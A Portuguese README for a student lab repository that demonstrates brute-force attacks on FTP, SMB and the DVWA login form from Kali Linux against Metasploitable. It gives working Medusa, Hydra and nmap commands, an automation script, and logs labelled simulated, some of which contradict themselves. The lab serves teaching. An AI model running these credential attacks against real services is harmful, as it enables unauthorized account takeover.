dio-medusa-kali-lab/
├── README.md
├── LICENSE
├── wordlists/
│   └── wordlist_small.txt
├── users/
│   └── users.txt
├── scripts/
│   └── run_medusa.sh
├── logs/
│   ├── nmap_full.txt
│   ├── medusa_ftp.log
│   ├── medusa_smbnt.log
│   └── hydra_dvwa.log
└── images/
    ├── 01_nmap_scan.png
    ├── 02_medusa_ftp_success.png
    ├── 03_smb_enum.png
    └── 04_dvwa_login_success.png
# Projeto: Ataques de Força Bruta com Medusa (Kali + Metasploitable/DVWA)

## ⚠️ Aviso Legal
Todos os testes descritos e executados neste repositório são **simulados** e/ou realizados exclusivamente em ambiente de laboratório controlado (VMs próprias). Nunca execute ataques de força bruta contra sistemas sem autorização explícita.

## Objetivo
Demonstrar e documentar ataques de força bruta em serviços comuns (FTP, SMB e formulários web) usando **Kali Linux** e **Medusa**, além de propor medidas de mitigação.

## Arquitetura do Lab (simulada)
- Kali Linux (atacante) — 192.168.56.101
- Metasploitable2 / DVWA (alvo) — 192.168.56.102
- Rede: Host-only / Internal Network

## Estrutura do repositório
- `wordlists/` — wordlists usadas
- `users/` — listas de usuários
- `scripts/` — scripts de automação
- `logs/` — logs simulados das execuções
- `images/` — imagens/screenshot simuladas (descrições)
- `README.md` — este arquivo

---

## Ferramentas
- Kali Linux
- Medusa
- Hydra (para formulário web quando necessário)
- Nmap
- smbclient

---

## Passo a passo (resumo)
1. Configurar VMs em rede host-only.
2. Executar enumeração com `nmap`.
3. Montar wordlists simples.
4. Realizar ataques:
   - FTP: força bruta com Medusa
   - SMB: password spraying + enumeração de usuários com Medusa
   - Web (DVWA): bruteforce do formulário com Hydra (ou medusa http_form quando suportado)
5. Registrar evidências (logs, screenshots).
6. Propor e documentar mitigação.

---

## Comandos utilizados (exemplos)

### Enumeração (Nmap)
```bash
nmap -sC -sV -p- -T4 192.168.56.102 -oN logs/nmap_full.txt
medusa -h 192.168.56.102 -U users/users.txt -P wordlists/wordlist_small.txt -M ftp -f | tee logs/medusa_ftp.log
medusa -h 192.168.56.102 -U users/users.txt -P wordlists/wordlist_small.txt -M smbnt -f | tee logs/medusa_smbnt.log
hydra -L users/users.txt -P wordlists/wordlist_small.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4 -w 5 | tee logs/hydra_dvwa.log
# Nmap 7.80 scan initiated Mon Oct 19 12:00:00 2025 for 192.168.56.102
Nmap scan report for 192.168.56.102
Host is up (0.00045s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
22/tcp   open  ssh        OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  microsoft-ds Samba smbd 3.X
Service Info: OSs: Unix, Linux
# Nmap done at Mon Oct 19 12:00:12 2025 -- 1 IP address (1 host up) scanned in 12.00 seconds
MEDUSA v2.2 ( http://www.foofus.net )
[+] Host: 192.168.56.102   Module: ftp   User: anonymous   Pass: ftp@localhost
[!] 1 valid credential returned
[+] 192.168.56.102:21 ftp - LOGIN SUCCESS: "ftpuser":"123456"
Task Completed
MEDUSA v2.2
[+] Host: 192.168.56.102   Module: smbnt   User: guest   Pass: letmein
[!] 1 valid credential returned
[+] 192.168.56.102:445 smbnt - LOGIN SUCCESS: "guest":"letmein"
Hydra v9.1
[DATA] attacking service http-post-form on port 80
[80][http-post-form] host: 192.168.56.102   login: admin   password: qwerty
1 of 1 target completed, 1 valid password found

---

# Arquivos de wordlists (conteúdo para copiar)

`wordlists/wordlist_small.txt`

`users/users.txt`

---

# Script de automação (scripts/run_medusa.sh)
```bash
#!/bin/bash
# run_medusa.sh - script simples para executar Medusa contra FTP e SMB (simulado)

TARGET="192.168.56.102"
USERS="users/users.txt"
PASS="wordlists/wordlist_small.txt"

echo "[*] Running Medusa FTP attack..."
medusa -h $TARGET -U $USERS -P $PASS -M ftp -f | tee logs/medusa_ftp.log

echo "[*] Running Medusa SMB password spraying..."
medusa -h $TARGET -U $USERS -P $PASS -M smbnt -f | tee logs/medusa_smbnt.log

echo "[*] Done. Logs in logs/"
git init
git add .
git commit -m "feat: initial lab simulation - medusa brute force examples"
gh repo create dio-medusa-kali-lab --public --source=. --remote=origin
git push -u origin main
